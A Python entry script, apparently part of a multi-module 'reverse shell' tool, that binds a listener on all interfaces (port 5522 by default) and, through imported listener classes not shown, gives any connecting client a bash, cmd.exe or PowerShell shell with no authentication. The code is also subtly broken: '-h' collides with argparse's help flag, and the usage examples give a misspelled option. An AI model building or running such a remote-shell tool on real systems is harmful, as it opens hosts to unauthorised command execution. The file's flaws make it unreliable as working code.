"""Main orchestrator for reverse shell system."""
from TASK_001_models import ExecutionResult, ReverseShellConfig
from TASK_002_unix_reverse_shell import UnixReverseShellListener
from TASK_003_windows_reverse_shell import WindowsReverseShellListener
import argparse
import signal
import sys
from typing import Optional, List



def create_reverse_shell_server(
    host: str = '0.0.0.0',
    port: int = 5522,
    shell_type: str = 'bash'
) -> UnixReverseShellListener | WindowsReverseShellListener:
    """Create and return the appropriate reverse shell listener based on platform.
    
    Args:
        host: The IP address to bind the listener to. Defaults to '0.0.0.0'.
        port: The TCP port to listen on. Defaults to 5522.
        shell_type: The type of shell to spawn ('bash' or 'cmd.exe').
        
    Returns:
        An instance of UnixReverseShellListener or WindowsReverseShellListener.
    """
    config = ReverseShellConfig(
        host=host,
        port=port,
        timeout=30.0,
        shell_type=shell_type
    )

    if shell_type == 'cmd.exe' or sys.platform.startswith('win'):
        return WindowsReverseShellListener(config)
    else:
        return UnixReverseShellListener(config)


def run_unix_listener(
    host: str = '0.0.0.0',
    port: int = 5522,
    timeout: float = 30.0
) -> List[ExecutionResult]:
    """Run the Unix reverse shell listener server.
    
    Accepts incoming TCP connections on the specified host:port and spawns
    subprocesses for each connected client, multiplexing I/O via select.select().
    
    Args:
        host: The IP address to bind to. Defaults to '0.0.0.0'.
        port: The TCP port to listen on. Defaults to 5522.
        timeout: Connection timeout in seconds. Defaults to 30.0.
        
    Returns:
        List of ExecutionResult objects from all connected clients.
        
    Raises:
        RuntimeError: If socket bind fails or server startup fails.
    """
    config = ReverseShellConfig(
        host=host,
        port=port,
        timeout=timeout,
        shell_type='bash'
    )
    
    listener = UnixReverseShellListener(config)
    results = []
    
    try:
        results = listener()
    except RuntimeError as e:
        print(f"Unix Listener Error: {e}", file=sys.stderr)
        raise
    
    return results


def run_windows_listener(
    host: str = '0.0.0.0',
    port: int = 5522,
    shell_type: str = 'cmd.exe'
) -> None:
    """Run the Windows reverse shell listener server.
    
    Accepts incoming TCP connections on the specified host:port and spawns
    cmd.exe or powershell.exe processes with redirected I/O through socket
    communication using os.dup2().
    
    Args:
        host: The IP address to bind to. Defaults to '0.0.0.0'.
        port: The TCP port to listen on. Defaults to 5522.
        shell_type: The type of shell ('cmd.exe' or 'powershell.exe').
        
    Raises:
        RuntimeError: If socket bind fails or server startup fails.
    """
    config = ReverseShellConfig(
        host=host,
        port=port,
        timeout=30.0,
        shell_type=shell_type
    )
    
    listener = WindowsReverseShellListener(config)
    try:
        listener.run()
    except RuntimeError as e:
        print(f"Windows Listener Error: {e}", file=sys.stderr)
        raise


def signal_handler(signum: int, frame: Optional[int]) -> None:
    """Handle SIGINT/SIGTERM gracefully by closing sockets and terminating
    child processes before exiting.
    
    Args:
        signum: The signal number received.
        frame: The current stack frame (unused).
    """
    print("\nReceived shutdown signal, cleaning up...")
    sys.exit(0)


def main() -> int:
    """Main entry point for the reverse shell orchestrator.
    
    Parses CLI arguments, instantiates the appropriate listener based on
    platform and shell_type selection, handles signals for graceful shutdown,
    and runs the server loop accepting connections and spawning subprocesses.
    
    Returns:
        Exit code (0 for success, non-zero for errors).
    """
    parser = argparse.ArgumentParser(
        description='Reverse Shell Orchestrator - Unix and Windows listener',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python __main__.py --shell_type bash           # Unix reverse shell (default)
  python __main__.py --shell_type cmd.exe         # Windows reverse shell
  python __main__.py --host 127.0.0.1 --port 9999
        """
    )

    parser.add_argument(
        '--host', '-h',
        type=str,
        default='0.0.0.0',
        help='Host IP to bind the listener to (default: 0.0.0.0)'
    )

    parser.add_argument(
        '--port', '-p',
        type=int,
        default=5522,
        help='TCP port to listen on (default: 5522)'
    )

    parser.add_argument(
        '--timeout', '-t',
        type=float,
        default=30.0,
        help='Connection timeout in seconds (default: 30.0)'
    )

    parser.add_argument(
        '--shell-type', '-s',
        type=str,
        choices=['bash', 'sh', 'cmd.exe', 'powershell.exe'],
        default='bash',
        help='Shell type to spawn (default: bash for Unix, cmd.exe for Windows)'
    )

    parser.add_argument(
        '--platform', '-P',
        type=str,
        choices=['unix', 'windows', 'auto'],
        default='auto',
        help='Target platform mode (default: auto-detects from shell_type)'
    )

    args = parser.parse_args()

    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print(f"Reverse Shell Orchestrator")
    print(f"  Host: {args.host}")
    print(f"  Port: {args.port}")
    print(f"  Timeout: {args.timeout}s")
    print(f"  Shell Type: {args.shell_type}")
    print(f"  Platform Mode: {args.platform}")
    print("-" * 50)

    try:
        if args.platform == 'auto':
            listener = create_reverse_shell_server(
                host=args.host,
                port=args.port,
                shell_type=args.shell_type
            )
        elif args.platform == 'unix':
            listener = UnixReverseShellListener(
                ReverseShellConfig(
                    host=args.host,
                    port=args.port,
                    timeout=args.timeout,
                    shell_type=args.shell_type
                )
            )
        elif args.platform == 'windows':
            listener = WindowsReverseShellListener(
                ReverseShellConfig(
                    host=args.host,
                    port=args.port,
                    timeout=args.timeout,
                    shell_type=args.shell_type
                )
            )
        else:
            raise ValueError(f"Unknown platform mode: {args.platform}")

        if isinstance(listener, UnixReverseShellListener):
            results = listener()
            print(f"\n{'='*50}")
            print("Execution Results:")
            for result in results:
                print(f"  Exit Code: {result.exit_code}")
                print(f"  Stdout:    {result.stdout[:200]}..." if len(result.stdout) > 200 else f"  Stdout:    {result.stdout}")
                print(f"  Stderr:    {result.stderr[:200]}..." if len(result.stderr) > 200 else f"  Stderr:    {result.stderr}")
            return 0

        elif isinstance(listener, WindowsReverseShellListener):
            listener.run()
            return 0

        else:
            raise ValueError(f"Unknown listener type: {type(listener)}")

    except KeyboardInterrupt:
        print("\nInterrupted by user (Ctrl+C)")
        return 130
    except RuntimeError as e:
        print(f"\nError: {e}", file=sys.stderr)
        return 1
    except Exception as e:
        print(f"\nUnexpected error: {type(e).__name__}: {e}", file=sys.stderr)
        return 2


if __name__ == '__main__':
    sys.exit(main())
